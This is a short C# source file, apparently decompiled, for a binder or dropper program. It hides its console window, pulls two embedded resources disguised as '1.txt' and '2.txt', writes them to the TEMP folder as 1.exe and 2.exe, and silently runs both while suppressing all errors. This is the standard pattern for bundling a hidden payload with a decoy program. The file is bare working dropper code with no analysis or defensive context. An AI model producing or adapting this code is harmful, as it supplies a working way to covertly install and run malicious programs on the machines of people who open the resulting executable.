using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

internal class Class0
{
	public static FileStream fileStream_0;

	public static FileStream fileStream_1;

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	private static void Main(string[] args)
	{
		try
		{
			FreeConsole();
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("1.txt");
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			manifestResourceStream.Close();
			Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("2.txt");
			byte[] array2 = new byte[manifestResourceStream2.Length];
			manifestResourceStream2.Read(array2, 0, array2.Length);
			fileStream_0 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\1.exe", FileMode.Create);
			fileStream_0.Write(array, 0, array.Length);
			fileStream_0.Close();
			fileStream_0.Dispose();
			fileStream_1 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\2.exe", FileMode.Create);
			fileStream_1.Write(array2, 0, array2.Length);
			fileStream_1.Close();
			fileStream_1.Dispose();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\1.exe";
			process.Start();
			Process process2 = new Process();
			process2.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\2.exe";
			process2.Start();
		}
		catch
		{
		}
	}
}
